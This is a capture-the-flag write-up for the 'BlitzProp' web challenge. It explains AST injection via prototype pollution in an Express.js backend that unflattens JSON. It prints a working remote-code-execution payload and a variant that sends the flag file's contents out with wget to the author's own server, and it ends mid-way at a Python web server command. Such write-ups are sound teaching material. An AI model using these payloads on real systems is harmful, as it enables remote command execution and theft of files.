# BlitzProp

Challenge text:
```
A tribute page for the legendary alien band called BlitzProp!
```
And the [source code](web_blitzprop)

The webpage had a form where you could submit your favorite song, which got send to the express.js backend in json format. Example:
```json
{
    "song.name": "ASTa la vista baby"
}
```
As we see in the source code, the request body is [unflattened](https://www.npmjs.com/package/flat), before later worked on. Due to this, and the hints from the song names, I assumed that the site was vulnerable to AST injection via prototype pollution. 

I found [this great blog post explaining it](https://blog.p6.is/AST-Injection/), and a working payload at the bottom.
```json
{
    "song.name": "ASTa la vista baby",
    "__proto__.block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync(`ls`)"
    }
}
```
Now all I had to do was execute a shell command which would somehow get me the flag file (as I couldn't see the output of the shell commands). I tried a bash reverse shell, to no avail, and the machine didn't have curl either. I ended up wget'ting my web server with the flag file's content as the url path, which gave me the flag.

```

        "line": "process.mainModule.require('child_process').execSync(`wget myurl/$(cat /app/flag*)`)"
    }
}
```

And on my webserver I saw
```bash
$ py -m http.server 3000
